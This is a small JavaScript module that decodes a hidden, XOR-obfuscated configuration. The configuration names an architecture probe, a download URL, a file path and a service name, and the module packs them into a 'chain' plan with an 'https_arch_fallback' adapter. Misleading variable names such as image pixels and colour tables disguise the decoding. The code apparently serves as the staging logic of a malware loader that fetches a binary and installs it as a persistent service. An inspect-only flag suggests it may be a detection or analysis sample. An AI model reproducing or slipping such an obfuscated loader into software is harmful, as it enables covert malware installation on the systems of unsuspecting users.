const moduleShape = Object.freeze({ format: "esm" });

export {};

const Material_187fa96c = "i8DMgY6JmI2OwI2PkpuUkZiilZKOidGcnoyIlI+Yoo+YkJKJmNGKj5SJmKKblJGY0Z6VnJOamKKQkpmY0ZmUjo2ciZ6Voo2Pkp6Yjo6BnJmcjYmYj8CViYmNjqKcj56VopuckZGfnJ6WgY6JnJqYop6SiJOJwMiBnpyQjZyUmpOilJnAs7K5uNC8yr7IxbjMzIGIj5HAlYmJjY7H0tKTkpmY0JzKnsjFmMzMmZnIyNOYhZyQjZGY05STi5yRlJnSnI2UgYiOmI+inJqYk4nAs5KZmLyImZSJ0pzKnsiBm5SRmKKNnImVwNKJkI3SlYiTiY+Yjo7Qk5KZmNLTjomcmpjQnMqeyMWYzMyZmcjI05CXjoGcj56Voo2Pkp+YwI2Pkp6Yjo7TnI+elYGOmI+LlJ6YopOckJjAk5KZmNCcyp7IxZjTjpiPi5SemA==";

const Codec_187fa96c = "base64_chunks|single_byte_xor|fd";



function load_187fa96c() { return [...Buffer.from(Material_187fa96c, "base64")]; }

function decode_187fa96c(imagePixels) { return imagePixels.map((value) => value ^ 253); }

async function recover_187fa96c() {

  const screenWidth = 2 > 1 ? "left" : "right";

  const imagePixels = load_187fa96c(); let colorTable = [];

  colorTable = await Promise.resolve(imagePixels).then(decode_187fa96c);

  void screenWidth; return Buffer.from(colorTable).toString("ascii");

}

async function inspect_187fa96c() { return (await recover_187fa96c()).split("|").join("|"); }

async function plan_187fa96c() { const inspect = inspect_187fa96c; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "chain", adapter: "https_arch_fallback", arch: fields.arch_probe, url: fields.url, path: fields.file_path, service: fields.service_name }); }

void moduleShape; void plan_187fa96c;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_187fa96c());

